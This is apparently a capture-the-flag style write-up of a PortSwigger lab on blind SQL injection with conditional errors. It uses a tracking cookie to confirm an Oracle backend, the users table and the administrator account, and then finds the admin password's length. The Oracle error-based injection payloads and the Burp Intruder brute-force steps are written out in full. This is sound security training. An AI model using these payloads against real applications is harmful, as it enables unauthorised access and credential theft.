## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/efc4ad9e-de11-4b84-87bd-cc445f4ef423)

## Solution :

Query made - 

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<COOKIE-VALUE>'
```
#### trying to find the error messages-

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''
```

Add an extra `'` symbol.it was showing error.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/1d39da04-bb00-4b76-877d-805ef4d941ba)

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'''
```

Add 2 extra `'` symbol.We get a response that shows the SQL syntax is right

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/042cb032-0ea4-4984-9707-f9a6f1eb88ca)

#### Checking database with conditional errors  -

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''||(SELECT '')||'
```
Error. This is because the database is **ORACLE**.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/d0428fac-7368-49da-b2a6-2734ded02e40)
 
 for that we need to specify a table called **DUAL**
 
 ```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''||(SELECT ''FROM dual)||'
```
 
 ![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/5f52a53b-46a2-4ac8-83e9-2c0989533e43)

 No error we got respones.So it is orcal database.
 
#### Check Whether the users table is present  -

 ```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/9d7098fa-650d-4889-b8a0-06e9d038d7e5)

no erorr which means table exist.

*Keep in mind* > using WHERE ROWNUM = 1 is crucial. It ensures our query doesn't bring back more than one row, which could mess up our concatenation process.

#### Check Whether the username administrator is present in users table -

```Here table name is users```

We can exploit this error inducing queries to test if admin user is present or not.

>Points to rember here in qury it will always perform the `FROM` portion first if this is true then it will go to the `SELECT` portion.

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/8fd94e70-db25-4e08-b68c-f25af1e1139d)


We receive an error. means the condition is *TRUE* and username administrator is present in users table .

when we use `1=2`

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/0829dfc4-75e2-4075-afe2-375a8c7f96b4)

We receive no error. means the condition is *False* and username administrator is present in users table .

#### Determine the length of admin's password -

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>25) ||'
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/503f1698-b7c9-417d-967c-0da900c2d30c)


```no error which which means the length of the password is less than 25```

```To find the length of the password send qury to  Intruder then and Add the password length part as payload and select attack type as SNIPER .Then go to  payload sleect payload type as numbers after that set from 1 to 25 and start the attack ```

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>$1$) ||'
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/33a82c83-2746-4cc4-bc58-10f0efb7f4bf)

From line  20, we are not  getting  an error where condition is *(LENGTH > 20)*.

![Screenshot 2024-02-04 212405](https://github.com/ananthan05/Portswigger_labs/assets/140697378/4e5bb4c7-12a9-479b-8197-71eff7277f53)

Password length  is  **20** characters long.
